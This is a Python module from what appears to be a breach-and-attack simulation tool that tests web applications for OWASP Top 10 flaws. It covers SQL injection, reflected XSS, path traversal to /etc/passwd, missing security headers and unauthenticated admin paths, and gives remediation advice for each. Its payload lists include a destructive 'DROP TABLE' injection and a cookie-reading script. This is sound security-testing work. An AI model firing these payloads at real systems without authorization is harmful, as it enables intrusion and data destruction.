"""
OWASP Web Attacks Module
MITRE ATT&CK: T1190 — Exploit Public-Facing Application

Tests for common OWASP Top 10 vulnerabilities:
  A01 — Injection (SQLi)
  A02 — Broken Authentication
  A03 — XSS
  A05 — Security Misconfiguration (headers)
  A06 — Vulnerable Components (server headers)
  A07 — Path Traversal
"""

import asyncio
import aiohttp
import re
import logging
from typing import List, Optional
from urllib.parse import urljoin, urlparse

from bas_engine.attack_modules.base import BaseAttackModule
from bas_engine.models.simulation import Finding, Severity

logger = logging.getLogger("secureforge.module.owasp_web")

# ── Payloads ───────────────────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "admin'--",
    "' OR 'x'='x",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "'\"><script>alert(document.cookie)</script>",
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
]

SQLI_ERROR_PATTERNS = [
    r"sql syntax",
    r"mysql_fetch",
    r"ORA-\d{5}",
    r"Microsoft OLE DB",
    r"ODBC.*Error",
    r"SQLiteException",
    r"pg_query\(\)",
    r"Unclosed quotation mark",
]

SENSITIVE_HEADERS_MISSING = [
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Content-Security-Policy",
    "Strict-Transport-Security",
    "Referrer-Policy",
    "Permissions-Policy",
]


class OWASPWebModule(BaseAttackModule):
    MODULE_NAME  = "owasp_web"
    DESCRIPTION  = "OWASP Top 10 web vulnerability simulation (T1190)"
    MITRE_TACTIC = "Initial Access"
    MITRE_IDS    = ["T1190", "T1059.007"]

    async def execute(self) -> List[Finding]:
        findings: List[Finding] = []
        target = self.target
        if not target.startswith(("http://", "https://")):
            target = f"http://{target}"

        timeout = aiohttp.ClientTimeout(total=10)
        connector = aiohttp.TCPConnector(ssl=False)

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"User-Agent": "SecureForge-BAS/1.0 (authorized security testing)"},
        ) as session:

            # ── Baseline request ───────────────────────────────────────────────
            baseline = await self._get(session, target)
            if baseline is None:
                findings.append(self.finding(
                    title       = "Target Unreachable",
                    description = f"Could not connect to {target}. Service may be down or filtered.",
                    severity    = Severity.INFO,
                    evidence    = f"Connection failed to {target}",
                ))
                return findings

            status, headers, body = baseline

            # ── A05/A06: Security headers & server disclosure ──────────────────
            findings.extend(await self._check_headers(target, headers))

            # ── A03: XSS probes ────────────────────────────────────────────────
            if self.options.get("test_xss", True):
                findings.extend(await self._test_xss(session, target, body))

            # ── A01: SQLi probes ───────────────────────────────────────────────
            if self.options.get("test_sqli", True):
                findings.extend(await self._test_sqli(session, target))

            # ── A07: Path traversal ────────────────────────────────────────────
            if self.options.get("test_path_traversal", True):
                findings.extend(await self._test_path_traversal(session, target))

            # ── A02: Auth bypass heuristics ────────────────────────────────────
            if self.options.get("test_auth", True):
                findings.extend(await self._test_auth_bypass(session, target))

        return findings

    # ── Header checks ──────────────────────────────────────────────────────────

    async def _check_headers(self, target: str, headers: dict) -> List[Finding]:
        findings = []

        # Server version disclosure
        server = headers.get("Server", "")
        if server and re.search(r"\d+\.\d+", server):
            findings.append(self.finding(
                title       = "Server Version Disclosed in Header",
                description = f"The 'Server' response header reveals version information: {server!r}. "
                              "This aids fingerprinting and targeted exploit selection.",
                severity    = Severity.LOW,
                mitre_id    = "T1592",
                evidence    = f"Server: {server}",
                remediation = "Configure web server to suppress version info (e.g. 'ServerTokens Prod' in Apache).",
            ))

        # X-Powered-By
        xpb = headers.get("X-Powered-By", "")
        if xpb:
            findings.append(self.finding(
                title       = "X-Powered-By Header Exposed",
                description = f"Technology stack revealed: {xpb!r}",
                severity    = Severity.LOW,
                mitre_id    = "T1592",
                evidence    = f"X-Powered-By: {xpb}",
                remediation = "Remove X-Powered-By header via server config or middleware.",
            ))

        # Missing security headers
        missing = [h for h in SENSITIVE_HEADERS_MISSING if h not in headers]
        if missing:
            findings.append(self.finding(
                title       = "Missing HTTP Security Headers",
                description = f"{len(missing)} recommended security headers are absent: {', '.join(missing)}. "
                              "These headers protect against clickjacking, MIME sniffing, and XSS.",
                severity    = Severity.MEDIUM,
                mitre_id    = "T1190",
                evidence    = f"Missing: {missing}",
                remediation = (
                    "Add these headers to your web server / reverse proxy config:\n"
                    "  X-Frame-Options: DENY\n"
                    "  X-Content-Type-Options: nosniff\n"
                    "  Content-Security-Policy: default-src 'self'\n"
                    "  Strict-Transport-Security: max-age=31536000; includeSubDomains"
                ),
                raw_data    = {"missing_headers": missing},
            ))

        # HTTPS check
        if target.startswith("http://"):
            findings.append(self.finding(
                title       = "Service Accessible Over HTTP (No TLS)",
                description = "The application is served over unencrypted HTTP. "
                              "All traffic including credentials is transmitted in plaintext.",
                severity    = Severity.HIGH,
                mitre_id    = "T1557",
                evidence    = f"URL: {target}",
                remediation = "Enforce HTTPS. Redirect all HTTP to HTTPS. Obtain a TLS certificate (Let's Encrypt).",
            ))

        return findings

    # ── XSS ───────────────────────────────────────────────────────────────────

    async def _test_xss(self, session, target: str, body: str) -> List[Finding]:
        findings = []
        # Find form inputs in baseline HTML (simple regex scan)
        input_params = re.findall(r'name=["\'](\w+)["\']', body)
        if not input_params:
            input_params = ["q", "search", "input", "name", "email"]

        for payload in XSS_PAYLOADS[:3]:  # limit for speed
            for param in input_params[:3]:
                url = f"{target}?{param}={payload}"
                result = await self._get(session, url)
                if result:
                    _, _, resp_body = result
                    if payload in resp_body:
                        findings.append(self.finding(
                            title       = "Reflected XSS Vulnerability",
                            description = f"User input is reflected unescaped in the response for parameter '{param}'. "
                                          "An attacker can inject malicious scripts executed in victims' browsers.",
                            severity    = Severity.HIGH,
                            mitre_id    = "T1059.007",
                            evidence    = f"Payload reflected: {payload!r} in ?{param}=",
                            remediation = (
                                "1. Encode all user-supplied output (HTML entity encoding).\n"
                                "2. Implement a Content-Security-Policy header.\n"
                                "3. Use a WAF with XSS rulesets."
                            ),
                            raw_data    = {"param": param, "payload": payload},
                        ))
                        return findings  # one finding is enough

        return findings

    # ── SQLi ───────────────────────────────────────────────────────────────────

    async def _test_sqli(self, session, target: str) -> List[Finding]:
        findings = []
        params   = self.options.get("sqli_params", ["id", "user", "search", "q", "page"])

        for payload in SQLI_PAYLOADS[:4]:
            for param in params[:3]:
                url = f"{target}?{param}={payload}"
                result = await self._get(session, url)
                if result:
                    _, _, body = result
                    for pattern in SQLI_ERROR_PATTERNS:
                        if re.search(pattern, body, re.IGNORECASE):
                            findings.append(self.finding(
                                title       = "SQL Injection — Error-Based",
                                description = f"SQL error message detected in response for parameter '{param}'. "
                                              "The database layer is not properly sanitizing user input.",
                                severity    = Severity.CRITICAL,
                                mitre_id    = "T1190",
                                evidence    = f"Param={param}, Payload={payload!r}, Pattern={pattern}",
                                remediation = (
                                    "1. Use parameterized queries / prepared statements exclusively.\n"
                                    "2. Apply input validation and allowlisting.\n"
                                    "3. Run database with least-privilege credentials.\n"
                                    "4. Enable WAF with SQL injection rulesets."
                                ),
                                raw_data    = {"param": param, "payload": payload, "error_pattern": pattern},
                            ))
                            return findings  # avoid duplicate findings

        return findings

    # ── Path Traversal ─────────────────────────────────────────────────────────

    async def _test_path_traversal(self, session, target: str) -> List[Finding]:
        findings = []
        parsed   = urlparse(target)
        base     = f"{parsed.scheme}://{parsed.netloc}"

        for payload in PATH_TRAVERSAL_PAYLOADS:
            url = f"{base}/download?file={payload}"
            result = await self._get(session, url)
            if result:
                _, _, body = result
                if "root:" in body and "/bin/" in body:  # /etc/passwd signature
                    findings.append(self.finding(
                        title       = "Path Traversal — /etc/passwd Readable",
                        description = "The application allows directory traversal, exposing /etc/passwd. "
                                      "An attacker can read arbitrary files from the server filesystem.",
                        severity    = Severity.CRITICAL,
                        mitre_id    = "T1083",
                        evidence    = f"Payload: {payload} → /etc/passwd content returned",
                        remediation = (
                            "1. Validate and canonicalize all file paths server-side.\n"
                            "2. Restrict file access to a whitelist of allowed directories.\n"
                            "3. Run the application with minimal filesystem permissions."
                        ),
                        raw_data    = {"payload": payload},
                    ))
                    return findings

        return findings

    # ── Auth Bypass ────────────────────────────────────────────────────────────

    async def _test_auth_bypass(self, session, target: str) -> List[Finding]:
        findings = []
        admin_paths = ["/admin", "/admin/", "/dashboard", "/wp-admin", "/manager", "/console"]

        for path in admin_paths:
            url    = target.rstrip("/") + path
            result = await self._get(session, url)
            if result:
                status, _, body = result
                if status == 200 and len(body) > 200:
                    findings.append(self.finding(
                        title       = "Admin Endpoint Accessible Without Auth",
                        description = f"Administrative path '{path}' returned HTTP 200 without authentication. "
                                      "Exposed admin panels are prime targets for attackers.",
                        severity    = Severity.HIGH,
                        mitre_id    = "T1078",
                        evidence    = f"GET {url} → {status}, body length={len(body)}",
                        remediation = (
                            "1. Protect admin paths with authentication and authorization middleware.\n"
                            "2. Restrict admin access to internal/VPN networks via firewall rules.\n"
                            "3. Consider moving admin interfaces to a non-standard port."
                        ),
                        raw_data    = {"path": path, "status": status},
                    ))

        return findings

    # ── HTTP helper ────────────────────────────────────────────────────────────

    async def _get(self, session, url: str) -> Optional[tuple]:
        try:
            async with session.get(url, allow_redirects=True) as resp:
                body = await resp.text(errors="replace")
                return resp.status, dict(resp.headers), body
        except Exception as e:
            self.logger.debug(f"GET {url} failed: {e}")
            return None